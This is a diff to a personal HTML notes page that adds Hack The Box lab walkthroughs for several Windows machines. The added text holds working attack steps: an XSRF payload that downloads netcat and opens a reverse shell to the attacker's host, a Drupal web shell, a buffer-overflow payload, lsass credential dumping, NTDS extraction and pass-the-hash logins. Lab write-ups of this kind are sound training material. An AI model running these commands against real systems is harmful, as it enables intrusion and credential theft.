@@ -159,6 +159,19 @@
         
     </style>
 
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>    
+    <!-- <script src="particles.min.js"></script> -->
+    <script>
+        // Fetch the configuration asynchronously
+        fetch('particlesjs-config.json')
+            .then(response => response.json())
+            .then(config => {
+                // Initialize Particles.js with the retrieved configuration
+                particlesJS('particles-js', config);
+            })
+            .catch(error => console.error('Error fetching particlesjs-config.json:', error));
+    </script>
     <script>
         document.addEventListener("DOMContentLoaded", function() {            
             // ========================dropdown========================            
@@ -296,7 +309,7 @@
     <div id="particles-js"></div>
     <header>
         <h2 class="glow"># joe95's Notes</h2>
-        <br><span>last_update:Dec.14.2023</span>
+        <br><span>last_update:Dec.16.2023</span>
         <script src="displayVisitorInfo.js"></script>
         <br><span id="visitorInfo"></span>
     </header>
@@ -1953,85 +1966,137 @@
                         <br>10' UNION SELECT 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3;-- -
                         <br>$bad = array('$(','&'); $good = "ls";   which means we can use ';' or '|' to bypass filter
                         <br>if($_SERVER['REMOTE_ADDR'] == "::1"){   which means it only run on local
-                        <br>XSS(Cross Site Scripting) + XSRF(Cross Site Request Forgery) to get shell
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>XSRF(Cross Site Request Forgery)
+                        <br>hosting payload shell.js : var request = new XMLHttpRequest(); var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443'; request.open('POST', 'http://localhost/admin/backdoorchecker.php', true); request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); request.send(params);
+                        <br>submit to trigger request to kali: &lt;script src="http://10.10.14.5/shell.js"&gt&lt;/script&gt
+                        <br>then shell.js will cause itself POST local backdoorchecker.php with 'cmd=dir|payload'
+                        <br>due to the request is indeed comming from itself, which means ($_SERVER['REMOTE_ADDR'] == "::1") is true
+                        <br>thus excuting the payload
+                        <br><span class="step_title">Privilege_escalation(cortin–>system)</span>
+                        <br>found C:\bankv2.exe and `icacls bankv2.exe` output 'Toegang geweigerd' which is 'Access denied' in Dutch
+                        <br>`netstat -anop TCP` found PID:1564 running on TCP 0.0.0.0:910
+                        <br>`tasklist /FI "PID eq 1564" found it is bankv2.exe
+                        <br>enum a little using nc.exe and setup port forwarding
+                        <br>kali# chisel_1.7.6_linux_amd64 server -p 8000 --reverse
+                        <br>target> chisel.exe client 10.10.14.5:8000 R:910:127.0.0.1:910
+                        <br>the '4 digit PIN code to login' accept 0021
+                        <br>then the 'amount of e-coins' is the BoF input position
+                        <br>`msf-pattern_create -l 100` fill the 'amount' got '[$] Executing e-coin transfer tool: 0Ab1...'
+                        <br>`msf-pattern_offset -q 0Ab1` offsec is 32
+                        <br>test with AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCC got '[$] Executing e-coin transfer tool: BBBBCCCCCCCCCCCCCCCCCCCC'
+                        <br>payload: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\users\public\nc -e cmd.exe 10.10.14.5 9002
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Bastard (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Bastard (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>Drupal 7.x Services Module Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/41564.php
+                        <br>gobuster dir found '/rest'
+                        <br>edit: $url = 'http://10.10.10.9'; $endpoint_path = '/rest'; 'filename' => 'shell.php', 'data' => '<?php echo test;system($_REQUEST["cmd"]); ?>'
+                        <br>`php 41564.php`  File written: http://10.10.10.9/shell.php
+                        <br>`curl http://10.10.10.9/shell.php --data-urlencode "cmd=\\\\10.10.14.26\\share\\nc.exe -e cmd 10.10.14.26 9001"`
+                        <br>OR 44449.rb edit with `dos2unix 44449.rb` and use burp to turn 'POST to CHANGELOG.txt' into 'GET to CHANGELOG.txt' and let go others
+                        <br>Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/44449.rb
+                        <br>OR 44542.txt
+                        <br>Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC) /usr/share/exploitdb/exploits/php/webapps/44542.txt
+                        <br><span class="step_title">Privilege_escalation(iusr->system)</span>
+                        <br>0xdf run `\\10.10.14.14\share\Watson.exe` on target found MS11-046 
+                        <br>making watson.exe 
+                        <br>Get target .NET Versions: `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"` OR `c:\Windows\Microsoft.NET\Framework>dir /A:D`   '/A:D means list all dir'
+                        <br>Get target arch: `systeminfo` 
+                        <br>Compile Watson using Visual Studio: open Watson.sln->Project->Watson_Properties(Application) change 'Target framework' to the lastest version on target, Watson_Properties(Build) change cpu arch
+                        <br>Note: Watson Supported Versions till Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004 Windows Server 2016 & 2019
+                        <br>ippsec search 'windows server 2008' and use MS15-051
+                        <br>`ms15-051.exe "nc.exe -e cmd.exe 10.10.14.26 9002"`
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Bastion (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Bastion (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>`smbmap -H 10.10.10.134 -u anonymous` found 'backups' share has read&write
+                        <br>found WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+                        <br>install tool pack of guestmount(a tool for mounting virtual hard disk files on Linux) `apt install libguestfs-tools`
+                        <br>Failed: `guestmount --add ./smbmnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro ./smbmnt2/` 'no operating system was found on this disk'
+                        <br>It better run it on pwnbox(hackthebox internal network dedicated virtual machine)
+                        <br>`guestmount --add ./mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro ./mnt2/` I did this on pwnbox
+                        <br>found SAM,SECURITY,SYSTEM in /mnt2/Windows/System32/config/
+                        <br>`secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL` got hashes, crack with crackstation.net
+                        <br>cred: L4mpje:bureaulampje   administrator:thXLHM96BeKL0ER2
+                        <br>SSH with L4mpje:bureaulampje
                         <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>found PS C:\Program Files (x86)\mRemoteNG (remote connection management tool)
+                        <br>found password hash in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
+                        <br>https://github.com/kmahyyg/mremoteng-decrypt
+                        <br>`python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==` Password: thXLHM96BeKL0ER2
+                        <br>`ssh administrator@10.10.10.134`  thXLHM96BeKL0ER2
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Blackfield (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="hard">Blackfield (Hard/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>`smbmap -H 10.10.10.192 -u anonymous -R`  found lots of names in 'profiles$' share, edit them as smbprofiles_users.txt
+                        <br>`./GetNPUsers.py 'BLACKFIELD.local/' -usersfile ./smbprofiles_users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.192` only svc_backup and support output differently
+                        <br>`hashcat hashes.asreproast --wordlist /usr/share/wordlists/rockyou.txt` got support:#00^BlackKnight
+                        <br>Failed: `crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'`
+                        <br>Failed: `ldapsearch -h 10.10.10.192 -D cn=support,dc=blackfield,dc=local -w '#00^BlackKnight' -x -b 'dc=blackfield,dc=local'`
+                        <br>`crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'` `smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'` can READ: IPC$ NETLOGON profiles$ SYSVOL
+                        <br>`bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip`
+                        <br>bloodhound GUI search 'support', the user has 1 'First Degree Object Control' which is 'ForceChangePassword' on user 'AUDIT2020'
+                        <br>Linux example: `net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
+                        <br>0xdf use: `rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'`
+                        <br>Note: '23' is from https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN
+                        <br>Failed: `crackmapexec winrm 10.10.10.192 -u audit2020 -p '0xdf!!!'`
+                        <br>`crackmapexec smb 10.10.10.192 -u audit2020 -p '0xdf!!!'` `smbmap -H 10.10.10.192 -u audit2020 -p '0xdf!!!'` can READ: IPC$ NETLOGON profiles$ SYSVOL forensic 
+                        <br>found .\forensic\memory_analysis\lsass.zip  `unzip lsass.zip` got lsass.DMP lsass.zip
+                        <br>`pip3 install pypykatz` `pypykatz lsa minidump lsass.DMP` got svc_backup:9658d1d1dcd9250115e2205d9f48400d (NT hash)
+                        <br>`crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d` works
+                        <br>`evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`
+                        <br>Note: about lsass.dmp
+                        <br>Mimikatz can dump creds and hashes from lsass.exe. Anti-virus ban that, but attackers can use procdump.exe(Sysinternals signed by Microsoft) to dump lsass.exe 
+                        <br>then transfer dump and run mimikatz OR pypykatz on attacker's machine.
+                        <br>`procdump.exe -accepteula -ma lsass.exe lsass.dmp`
+                        <br>// or avoid reading lsass by dumping a cloned lsass process
+                        <br>`procdump.exe -accepteula -r -ma lsass.exe lsass.dmp`
+                        <br><span class="step_title">Privilege_escalation(svc_backup->administrator)</span>
+                        <br>`whoami /all`  shows 'SeBackupPrivilege   Back up files and directories  Enabled' which means 'basically allows for full system read' corrding to 0xdf
+                        <br>https://github.com/giuliano108/SeBackupPrivilege
+                        <br>root@kali# unix2dos cmd
+                        <br>transfer to target
+                        <br>*Evil-WinRM* PS C:\programdata> type cmd
+                        <br>set context persistent nowriters
+                        <br>add volume c: alias temp
+                        <br>create
+                        <br>expose %temp% h:
+                        <br>exit
+                        <br>*Evil-WinRM* PS C:\programdata> diskshadow /s cmd
+                        <br>*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeCmdLets.dll
+                        <br>*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeUtils.dll
+                        <br>*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll  
+                        <br>*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
+                        <br>*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -Overwrite
+                        <br>*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM c:\windows\temp\SYSTEM -Overwrite
+                        <br>*Evil-WinRM* PS C:\windows\temp> download NTDS
+                        <br>*Evil-WinRM* PS C:\windows\temp> download SYSTEM
+                        <br>root@kali# secretsdump.py -system SYSTEM -ntds NTDS LOCAL
+                        <br>root@kali# evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                     </div>
                 </div>
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Blue (difficulty/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <span class="step_title">Initial_Foothold(system)</span>
+                        <br>`nmap -p 445 -script vuln 10.10.10.40`
+                        <br>Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)   State: VULNERABLE
+                        <br>msf6 > search ms17-010
+                        <br>msf6 > use exploit/windows/smb/ms17_010_eternalblue
+                        <br>msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
+                        <br>msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.14
+                        <br>msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+                        <br>meterpreter > shell
+                        <br>OR use python script https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script
                     </div>
                 </div>
                 <div class="sub_dropdown">
@@ -3045,6 +3110,8 @@
                     <div class="sub_dropdown_content">
                         <span class="step_title">step 1</span>
 
+                        <br><span class="step_title">step2</span>
+
                     </div>
                 </div>
 
@@ -3062,7 +3129,7 @@
                     <div class="sub_dropdown_content">
                         <span class="step_title">step1</span>
 
-                        <span class="step_title">step2</span>
+                        <br><span class="step_title">step2</span>
                         
                     </div>
                 </div>
@@ -3075,16 +3142,5 @@
         <h5><a href="https://www.linkedin.com/in/joe912693295" target="_blank">LinkedIn Profile</a></h5>
         <h5>Certified: CCNP-RS | CCIE-Security</h5>
     </main>
-    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>    
-    <!-- <script src="particles.min.js"></script> -->
-    <script>
-        // Fetch the configuration asynchronously
-        fetch('particlesjs-config.json')
-            .then(response => response.json())
-            .then(config => {
-                // Initialize Particles.js with the retrieved configuration
-                particlesJS('particles-js', config);
-            })
-            .catch(error => console.error('Error fetching particlesjs-config.json:', error));
-    </script>
+    </body>
+</html>
